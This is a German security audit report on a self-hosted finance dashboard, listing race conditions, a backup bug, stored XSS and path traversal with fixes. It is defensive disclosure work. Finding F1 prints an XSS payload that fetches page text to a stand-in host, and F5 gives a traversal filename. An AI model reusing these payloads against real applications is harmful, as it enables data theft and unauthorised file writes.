# Sicherheitsaudit Finanz-Dashboard Neubau — Lauf 1 (12. September 2026)

Ziel: `C:\Users\lblet\dev\finanz-dashboard-sparten`, Branch `neubau`, HEAD `d5df927`. Methode: Aufklärung (3 Agenten),
Jagd (7 Agenten nach Angriffsklassen, mit dynamischen Nachweisen auf Wegwerf-Instanzen), Widerlegungsrunde (5 Agenten),
unabhängige Nachprüfung jedes Befunds (Phase 6). Kein Produktivsystem wurde berührt. Erster Lauf in diesem Format;
weitere Läufe finden erfahrungsgemäß zusätzliche Punkte.

## Zusammenfassung

Das System ist für einen Haushalt solide abgesichert: Nur im Tailscale-Netz erreichbar, Anmeldung mit scrypt-Hashes,
signierte Sitzungen mit serverseitiger Nonce-Liste, saubere Cookie-Attribute, Widerruf aller Sitzungen bei
Passwortwechsel, keine hartcodierten Geheimnisse, parametrisiertes SQL, defensiv geparste Modellausgaben, konsequente
Bereichsprüfung Haupt/Verein. **Kein Weg ohne Anmeldung** in die Daten wurde gefunden. Die bestätigten Befunde liegen
in zwei Klassen: (1) **Datenintegrität unter Nebenläufigkeit** (zwei Wettlauf-Fehler, die Geld doppelt buchen) und ein
**Backup-Fehler, der alle Belegkopien löscht**; (2) eine **gespeicherte XSS-Lücke** an genau einer ungeschützten
Render-Stelle, erreichbar über importierte Dateien. Alle vier hohen Befunde sind mit wenigen Zeilen behebbar und
**müssen vor der Umstellung auf CT 101** geschlossen werden; keiner davon existiert in der heute laufenden alten App.

## Vergleichsmaßstab

Selbst gehostete Haushaltsbücher (Firefly III, Actual Budget) laufen meist hinter einem öffentlichen Reverse-Proxy
mit Mehrbenutzer-Login. Dieses System ist restriktiver (Tailscale-only, Gerätefilter, ein Passwort) und verzichtet
dafür auf Rollen. Firefly III hatte mehrfach gespeicherte XSS über Import-Freitextfelder in Dashboard-Widgets; Befund 1
gehört in dieselbe Klasse. Upload-Größenlimits und Warteschlangenbegrenzung setzen die Vergleichsprodukte serverseitig.

## Befunde

| Nr. | Schwere | Titel |
|---|---|---|
| F1 | HOCH | Gespeicherte XSS über Kategorienamen (Excel-Import oder API) im Hinweise-Widget der Übersicht |
| F2 | HOCH | Wettlauf bei Rückerstattungen: parallele Aufrufe erstatten beliebig über den Originalbetrag hinaus |
| F3 | HOCH | Wettlauf bei „Beleg-Auswertung übernehmen“: ein Beleg wird mehrfach verbucht |
| F4 | HOCH | Backup-Rotation löscht den gesamten Belege-Store (Schlüsselvergleich passt nie), auch auf dem Zweitziel |
| F5 | MITTEL | Pfadausbruch beim Beleg-Upload über den Dateinamen (nur Windows-Betrieb, Linux-Produktion nicht betroffen) |
| F6 | NIEDRIG | Schreibschutz-Middleware antwortet vor Gerätefilter und Anmeldung und gibt Migrationsfehler preis |
| F7 | NIEDRIG | Kein Größenlimit für Uploads und Importe, vollständiges Einlesen in den Arbeitsspeicher |
| F8 | NIEDRIG | `GET /api/betrieb/migrationsprotokoll` ist nicht nach Bereich gefiltert (nur IDs, keine Beträge) |

### F1 — Gespeicherte XSS über Kategorienamen (HOCH)
- **Stellen:** `app/routers/import_excel.py:178` (Spaltenkopf → `_text`, nur `strip`), `:359` (INSERT), `app/routers/stammdaten.py:100-104`
  (API-Weg), `app/rechenbasis.py:248` (`hinweise()` bettet den Namen in den Text), `static-neu/pages/uebersicht.js:172`
  (`innerHTML` ohne `esc()`, einzige Ausnahme der Datei). Keine CSP (`app/auth.py:530-535`).
- **Angriff:** Ein Dritter liefert eine Kassabuch-Excel mit Spaltenkopf `<img src=x onerror="fetch('https://x/?d='+document.body.innerText)">`.
  Der Nutzer importiert sie (Modus „einspielen“). Sobald diese Kategorie im gewählten Zeitraum die höchsten Ausgaben hat
  (Bedingung: irgendeine Ausgabe, kein Schwellwert), rendert die Übersicht den Hinweis und das Skript läuft in der
  angemeldeten Sitzung. Reproduziert bis zum API-Text: `{"art":"kategorie_anteil","text":"<img src=x onerror=alert(1)>: 100% der Ausgaben."}`.
- **Auswirkung:** Beliebige `/api/*`-Aufrufe im Namen des Nutzers (Export, Buchungen, Löschen, Sicherung), Exfiltration ins Netz.
  Cookie ist httponly, das schützt nur das Cookie, nicht die Sitzung.
- **Fix:** `${esc(h.text)}` in `uebersicht.js:172`; zusätzlich Kategorienamen serverseitig auf ein enges Zeichenset
  begrenzen (`stammdaten.py`, `import_excel.py`) und `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'`
  in `AuthMiddleware._secure_headers` setzen.

### F2 — Wettlauf bei Rückerstattungen (HOCH)
- **Stellen:** `app/routers/buchungen.py:719-732` (Rest-Prüfung außerhalb jeder Transaktion), `:756` ruft `erstelle_buchung`,
  das erst in `:108` `BEGIN IMMEDIATE` öffnet und die Regel „Summe Erstattungen ≤ Original“ nicht erneut prüft; kein
  DB-Constraint (Migration 017).
- **Angriff (reproduziert):** Ausgabe 100 €, acht parallele `POST /api/buchungen/{id}/erstatten` mit je 100 € → sechsmal 201,
  `netto_cent = -50000` statt 0.
- **Auswirkung:** Kategorie- und Jahressummen dauerhaft falsch; Auslöser sind Doppelklick, zwei Geräte oder Netzwiederholung.
- **Fix:** Die Rest-Prüfung im `nach_anlage`-Hook wiederholen, der innerhalb der `BEGIN IMMEDIATE`-Transaktion von
  `erstelle_buchung` läuft (eine Exception dort rollt die Buchung zurück). **Kein** zweites `BEGIN IMMEDIATE` in
  `erstatten_buchung` öffnen, das kollidiert mit der Transaktion in `erstelle_buchung`.

### F3 — Wettlauf bei „Beleg-Auswertung übernehmen“ (HOCH)
- **Stellen:** `app/routers/beleg_auswertung.py:214` (Statusprüfung vor der Transaktion), `:247-257` setzt den Status
  bedingungslos auf `verbucht`, `:261` `erstelle_buchung`. `buchung_beleg` hat keinen UNIQUE auf `beleg_id`.
- **Angriff (reproduziert):** acht parallele `POST /api/beleg-auswertungen/{id}/uebernehmen` mit je neuer
  `client_request_id` → fünf Buchungen zu 50 € aus einem Beleg. Das Frontend deaktiviert den Knopf, schützt also den
  einfachen Doppelklick, nicht aber Skript oder zwei Geräte.
- **Fix:** Status atomar reservieren: `UPDATE beleg_auswertung SET status='verbucht' WHERE id=? AND status='fertig'` innerhalb
  der Transaktion und `rowcount` prüfen (409 bei 0), oder Statusprüfung in `beleg_verknuepfen_und_abschliessen` wiederholen.

### F4 — Backup-Rotation löscht den Belege-Store (HOCH)
- **Stellen:** `app/backup.py:449-452` sammelt Referenzen als `(sha256, Originalname)`, `:459` vergleicht gegen
  `(sha256, ".pdf")` → nie gleich → jede Store-Datei wird gelöscht. Auslöser `_rotiere` (`:429`) aus `_abschliessen`
  (`:218`) und `_sichere_belege` (`:160`), ab 31 Tageskopien oder sofort über `POST /api/betrieb/sicherung`
  (`app/routers/betrieb.py:134`); wirkt auch auf das Zweitziel (`:400`).
- **Nachweis (reproduziert):** zwei Belege, 31 Tageskopien, Rotation → Store leer, `pruefe_sicherung(heute)` meldet
  `belege_fehlend: 2, manifest_ok: False`. Der Test `tests/test_backup.py:139-145` erreicht die Schleife nie (nur 2 Kopien),
  `:188-206` hat keinen Store; die Vergleichslogik wird von keinem Test ausgeführt.
- **Auswirkung:** Der Beleg-Rückweg der Sicherung existiert faktisch nicht; gelöschte oder geänderte Belege sind aus allen
  Sätzen unwiderruflich weg. Als Sabotage: Beleg löschen + Sicherung anstoßen = endgültig. Nur im Neubau, nicht in `studio`.
- **Fix:** Referenzen als Store-Pfade sammeln (`_store_pfad(ordner, sha, dateiname).resolve()`) und `pfad.resolve()`
  vergleichen; Test mit echten 31 Kopien und befülltem Store nachziehen.

### F5 — Pfadausbruch beim Beleg-Upload (MITTEL, nur Windows)
- **Stellen:** `app/routers/belege.py:96` (roher Client-Dateiname), `:131-132` (`f"{beleg_id}_{original}"` als Pfad).
- **Angriff (reproduziert auf Windows):** `filename=../../../../evil.png` schreibt zwei Ebenen über den Belegordner; Endungs-
  Whitelist begrenzt auf Bild/PDF. Unter Linux scheitert es an `ENOENT`, weil `1_..` als Verzeichnis nicht existiert
  (Produktion CT 101 nicht betroffen, Windows ist der Entwicklungsweg).
- **Fix:** `original = pathlib.Path(datei.filename or "unbenannt").name`, danach `ziel.resolve().relative_to(basis.resolve())`
  prüfen (Muster aus `app/backup.py:94-101`); `OSError` beim Schreiben abfangen.

### F6 — Schreibschutz-Middleware vor Gerätefilter und Anmeldung (NIEDRIG)
- **Stellen:** `app/main.py:67-68` (`add_middleware`) und `:98-107` (`@app.middleware`, damit die äußerste). Reihenfolge per
  Stack-Aufbau bestätigt: Schreibschutz → TrustedHost → Auth.
- **Angriff (reproduziert):** Bei Migrationsfehler antwortet `POST /api/buchungen` einem nicht freigegebenen, nicht
  angemeldeten Peer mit 503 und dem vollen Fehlertext (Migrationsnummer, SQL, ggf. Pfad), ohne Sicherheitsheader.
- **Fix:** Schreibschutz als erste `add_middleware` registrieren (innen) und den 503-Text generisch halten.

### F7 — Kein Größenlimit für Uploads und Importe (NIEDRIG)
- **Stellen:** `app/routers/belege.py:106`, `import_bank.py:235`, `import_excel.py:289` (`datei.file.read()` komplett in den
  Speicher); kein `Content-Length`-Limit, kein `MemoryMax` dokumentiert.
- **Auswirkung:** Nur die angemeldete Sitzung; Selbst-DoS des Containers (RAM teilt sich mit Ollama), Platte voll über Belege.
- **Fix:** Obergrenze (z. B. 25 MB) vor dem Lesen prüfen, chunkweise lesen, 413 bei Überschreitung.

### F8 — Migrationsprotokoll ohne Bereichsfilter (NIEDRIG)
- **Stelle:** `app/routers/betrieb.py:25-28`; die Tabelle hat keine Bereichsspalte, enthält nur `buchung:<id>`-Kennungen
  und generische Hinweise, keine Beträge. Kein Frontend nutzt den Endpunkt.
- **Fix:** Endpunkt entfernen oder über Join `buchung→sparte→bereich_id` filtern.

## Auf dem Produktivsystem zu prüfen (nicht aus dem Repo beweisbar)

- **Gerätefilter und Rate-Limit hängen an `request.client.host`** (`app/auth.py:298-307`, `:134-165`). Hinter Tailscale Serve
  liefert das nur mit uvicorns Proxy-Header-Auswertung die Geräteadresse. uvicorn 0.34 hat `proxy_headers=True` und
  `forwarded_allow_ips=127.0.0.1` als Standard, dann funktioniert es korrekt und Header-Spoofing scheitert (bewiesen).
  Mit `--no-proxy-headers` ist der Filter wirkungslos und **fünf falsche Passwörter eines beliebigen Tailnet-Peers sperren
  den Eigentümer 15 Minuten aus** (bewiesen auf Wegwerf-Instanz); mit `FORWARDED_ALLOW_IPS=*` ist der Filter umgehbar.
  Prüfung auf CT 101: `systemctl cat finanz.service` (ExecStart, Drop-Ins), `tailscale serve status`, dann von einem nicht
  freigegebenen Tailnet-Gerät `curl -sk -o /dev/null -w '%{http_code}' https://finanz.tailb1b087.ts.net/api/health`
  (erwartet 403) und dasselbe mit `-H 'X-Forwarded-For: 100.105.4.18'` (erwartet weiterhin 403).
  Empfehlung unabhängig vom Ergebnis: `--proxy-headers --forwarded-allow-ips=127.0.0.1` explizit in `ExecStart`, Regressionstest
  „ohne X-Forwarded-For ⇒ 403“ ergänzen.

## Härtungsnotizen (keine Befunde)

- CSP fehlt komplett; sie wäre die zweite Bremse für F1 und jede künftige Escaping-Lücke.
- `/docs`, `/redoc`, `/openapi.json` sind angemeldet erreichbar; für eine Ein-Nutzer-App abschalten.
- Mindestpasswortlänge 6 ohne Komplexität; Rate-Limit nur im Speicher (Neustart hebt es auf). 10–12 Zeichen Minimum.
- `AuthSettings.from_config` prüft die Mindestlänge des `session_secret` nicht (`app/auth.py:129-131`).
- Recovery: Timing-Unterschied verrät, ob ein Code hinterlegt ist (4 ms vs. 80 ms); zwei gleichzeitige gültige
  Recovery-Aufrufe zeigen zwei Codes, nur einer wird gespeichert.
- `FINANZ_TEST_AUTH_BYPASS` ist über `TMPDIR` steuerbar; im Produktionsartefakt entfernen oder an `FINANZ_INSTANZ=test` koppeln.
- IPv6-Adressen werden als Strings verglichen (`app/auth.py:298-307`); `ipaddress` verwenden.
- Auswertungswarteschlange ohne Obergrenze (nur eigene Sitzung; Cap von z. B. 5 offenen Aufträgen sinnvoll).
- `POST /api/betrieb/sicherung` ohne Rate-Limit; `POST /api/export/paket` baut das ZIP im Speicher.
- SQLite ohne `busy_timeout`/WAL lokal; `request_wiederholung` und `client_request_id` unbegrenzt.
- `.gitignore` deckt `backup/` (Singular) und `belege-store/` nicht ab; nie ein Geheimnis committet (Historie geprüft).
- `scripts/umstellung_pruefung.py` akzeptiert `http://` und sendet den Cookie dann im Klartext.
- Doku-Korrekturen: `docs/SICHERHEIT.md` (App prüft keinen Header selbst, uvicorn tut das), Middleware-Reihenfolge.
- Abhängigkeiten sind gepinnt; starlette 0.41.3 hat eine Multipart-Spooling-DoS (behoben in 0.47.2), nur durch den
  angemeldeten Nutzer erreichbar. Gegen eine aktuelle Advisory-Datenbank prüfen.

## Was gut gemacht ist

- Ein einziger Auth-Choke-Point, deny-by-default für alle Pfade, 14 Pfadvarianten und HEAD/OPTIONS korrekt abgewiesen.
- Sitzungen: fester HMAC-SHA256, `compare_digest`, `iat/exp`-Prüfung, serverseitige Nonce-Liste, Rotation des Secrets
  bei jedem Passwortvorgang, `__Host-`-Cookie mit allen Attributen. Recovery-Code mit 140 Bit, einmalig, rate-limitiert.
- Kein zustandsändernder GET, kein CORS, feste Redirects, Sicherheitsheader (`no-store`, `nosniff`, `DENY`, `no-referrer`).
- SQL durchgehend parametrisiert, LIKE mit ESCAPE, Spaltennamen nur aus Pydantic-Feldern oder Whitelists.
- Bereichstrennung Haupt/Verein in allen geprüften Schreibpfaden dicht (Buchungen, Umbuchung, Erstattung, Sammelverbuchung,
  Regeln, Kredite, Abgleich); 404 unterscheidet nicht zwischen „fremd“ und „fehlt“.
- KI-Pfad: keine Werkzeugfähigkeiten, strikte JSON-Validierung, Kategorien nur aus der eigenen Liste, Übernahme nur per Klick,
  Merkregeln entstehen nicht aus KI-Übernahmen, `auto_verbuchen` beim Lernen hart 0; Live-Injektionstest abgewehrt.
- Downloads als `attachment` mit `nosniff`; Excel-Export mit Formel-Schutz; HTML-Bericht mit `html.escape`; Backup-Manifeste
  mit Ausbruchsschutz; Test-Bypass an Temp-Datenbanken gekoppelt; keine Stacktraces in Fehlerantworten.

## Empfohlene Reihenfolge

1. F4 (Backup) und F1 (XSS) sofort, beide sind Einzeiler plus Test bzw. plus CSP.
2. F2 und F3 (Transaktionsgrenzen) vor der Umstellung, mit Nebenläufigkeitstests.
3. F5, F6, F7 im nächsten Kleinkram-Paket; F8 mit dem Endpunkt entscheiden.
4. Auf CT 101 bei der Umstellung: ExecStart-Flags und der 403-Test von einem fremden Tailnet-Gerät.
